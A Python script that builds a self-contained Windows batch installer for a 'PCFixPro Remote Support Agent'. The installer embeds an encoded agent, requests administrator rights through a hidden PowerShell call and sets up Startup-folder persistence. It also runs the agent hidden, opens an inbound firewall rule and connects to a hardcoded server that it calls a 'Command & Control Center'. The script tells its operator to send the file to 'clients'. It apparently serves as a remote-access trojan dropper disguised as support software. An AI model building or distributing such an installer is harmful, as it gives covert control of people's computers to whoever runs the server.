#!/usr/bin/env python3
"""
PCFixPro Single-File Installer Creator
Creates ONE .bat file that contains ALL code embedded - no external ZIP needed
"""
import os
import sys
import base64
from pathlib import Path

def create_single_installer(server_ip=None):
    """Create a single self-contained installer with all code embedded"""
    script_dir = Path(__file__).parent
    downloads_dir = script_dir.parent / "downloads"
    downloads_dir.mkdir(exist_ok=True)
    
    # Read agent.py and clean up
    agent_py = (script_dir / "agent.py").read_text()
    
    # Clean the agent content - remove the hardcoded server URL line
    clean_agent_lines = []
    for line in agent_py.split('\n'):
        if 'SERVER_URL = "' in line and '192.168' in line:
            continue  # Skip the hardcoded URL, we'll set it dynamically
        clean_agent_lines.append(line)
    clean_agent = '\n'.join(clean_agent_lines)
    
    # Encode the agent script as base64
    agent_b64 = base64.b64encode(clean_agent.encode('utf-8')).decode('utf-8')
    
    # Create the single installer
    installer_path = downloads_dir / "PCFixPro_Installer.bat"
    
    installer_content = f"""@echo off
:: PCFixPro Remote Support Agent - Single File Installer v2.0
:: All code is embedded - no external files needed
:: Creates automatic session with IP logging

setlocal enabledelayedexpansion

:: Configuration
"""
    
    installer_content += f"set SERVER_IP={server_ip or '102.209.236.22'}\n"
    
    installer_content += """
echo ========================================
echo PCFixPro Remote Support Agent Installer
echo ========================================
echo.

:: Log client IP
for /f "tokens=2 delims=[]" %%a in ('ping -4 -n 1 localhost ^| findstr "["') do set CLIENT_IP=%%a
if "!CLIENT_IP!"=="" set CLIENT_IP=unknown

echo [INFO] Client IP: !CLIENT_IP!
echo.

:: Auto-elevate to admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [INFO] Requesting administrator privileges...
    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs" -WindowStyle Hidden
    exit /b
)

echo [OK] Administrator privileges confirmed
echo [OK] Server: http://%SERVER_IP%:5000
echo.

:: Create installation directory
set "INSTALL_DIR=C:\\Program Files\\PCFixPro Agent"
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

:: Extract and decode embedded agent
echo [1/3] Installing agent...
powershell -Command "& {{[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{base64}')) | Out-File -FilePath '%INSTALL_DIR%\\agent.py' -Encoding UTF8}}"

:: Write config file with server IP
(
echo {{
echo   "server_url": "http://%SERVER_IP%:5000",
echo   "install_date": "%date% %time%",
echo   "client_ip": "!CLIENT_IP!",
echo   "hostname": "%COMPUTERNAME%"
echo }}
) > "%INSTALL_DIR%\\config.json"

:: Install Python dependencies silently
echo [2/3] Installing dependencies...
pip install python-socketio requests pywin32 --quiet --no-warn-script-location 2>nul

:: Start the agent
echo [3/3] Starting agent...
cd /d "%INSTALL_DIR%"

:: Create startup entry - fixed path
echo import os, sys, subprocess > "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pcfixpro_agent.py"
echo sys.path.insert(0, r'%INSTALL_DIR%') >> "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pcfixpro_agent.py"
echo os.chdir(r'%INSTALL_DIR%') >> "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pcfixpro_agent.py"
echo subprocess.Popen([sys.executable, 'agent.py']) >> "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pcfixpro_agent.py"

:: Start agent now (hidden)
start /B pythonw.exe "%INSTALL_DIR%\\agent.py"

:: Create firewall rule
netsh advfirewall firewall add rule name="PCFixPro Agent" dir=in action=allow program="pythonw.exe" enable=yes >nul 2>&1

:: Create desktop status file
echo PCFixPro Agent Installed > "%USERPROFILE%\\Desktop\\PCFixPro_Agent_Status.txt"
echo Server: http://%SERVER_IP%:5000 >> "%USERPROFILE%\\Desktop\\PCFixPro_Agent_Status.txt"
echo Your IP: !CLIENT_IP! >> "%USERPROFILE%\\Desktop\\PCFixPro_Agent_Status.txt"
echo Hostname: %COMPUTERNAME% >> "%USERPROFILE%\\Desktop\\PCFixPro_Agent_Status.txt"
echo Date: %date% %time% >> "%USERPROFILE%\\Desktop\\PCFixPro_Agent_Status.txt"

echo.
echo ========================================
echo Installation Complete!
echo ========================================
echo Server: http://%SERVER_IP%:5000
echo Client IP: !CLIENT_IP!
echo Hostname: %COMPUTERNAME%
echo.
echo The agent is now running and will appear
echo in your Command & Control Center.
echo ========================================
echo.
pause
""".format(base64=agent_b64)
    
    installer_path.write_text(installer_content)
    print(f"[OK] Created single installer: {installer_path}")
    print(f"[INFO] Server IP: {server_ip or '102.209.236.22'}")
    print("[INFO] Send this .bat file to clients - it's fully self-contained!")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description='Create single-file installer')
    parser.add_argument('--server-ip', help='Server IP address', default='102.209.236.22')
    args = parser.parse_args()
    create_single_installer(args.server_ip)